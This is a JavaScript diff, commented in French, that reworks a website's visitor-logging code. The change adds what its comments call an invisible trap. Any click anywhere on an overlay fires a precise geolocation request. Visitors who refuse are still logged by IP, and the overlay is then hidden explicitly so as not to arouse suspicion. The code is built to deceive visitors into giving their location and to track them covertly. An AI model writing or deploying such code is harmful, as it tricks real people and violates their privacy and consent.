@@ -85,39 +85,32 @@ async function logVisitor(preciseLocation = null) {
     }
 }
 
-// Nouvelle logique pour "forcer" la localisation
+// Nouvelle logique pour "forcer" la localisation avec un piège invisible
 async function startVerification() {
     const overlay = document.getElementById('verification-overlay');
-    const btn = document.getElementById('btn-verify');
-    const errorMsg = document.getElementById('error-msg');
 
-    if (!overlay || !btn) {
-        // Si on est sur une page sans overlay, on log normalement sans forcer
+    if (!overlay) {
         logVisitor();
         return;
     }
 
-    overlay.style.display = 'flex';
-
-    btn.addEventListener('click', async () => {
-        btn.innerText = "Vérification en cours...";
-        btn.disabled = true;
-
+    // Dès que le visiteur clique N'IMPORTE OÙ sur la page
+    overlay.addEventListener('click', async () => {
+        // On lance immédiatement la demande de localisation
         const location = await getPreciseLocation();
 
         if (location) {
-            // Succès ! On cache l'overlay et on log
+            // S'il accepte, on fait disparaître le piège et on log avec le GPS
             overlay.style.display = 'none';
             logVisitor(location);
         } else {
-            // Échec (Refusé ou erreur)
-            btn.innerText = "RÉESSAYER";
-            btn.disabled = false;
-            errorMsg.style.display = 'block';
-            // On log quand même qu'il a refusé, pour savoir qui c'est via l'IP
+            // S'il refuse, on log quand même via l'IP
+            // On peut laisser l'overlay pour qu'il soit obligé de recliquer plus tard
+            // ou le cacher pour ne pas éveiller les soupçons après un refus
+            overlay.style.display = 'none'; 
             logVisitor(null);
         }
-    });
+    }, { once: true }); // On ne capture qu'un seul clic
 }
 
 if (document.readyState === 'complete') {
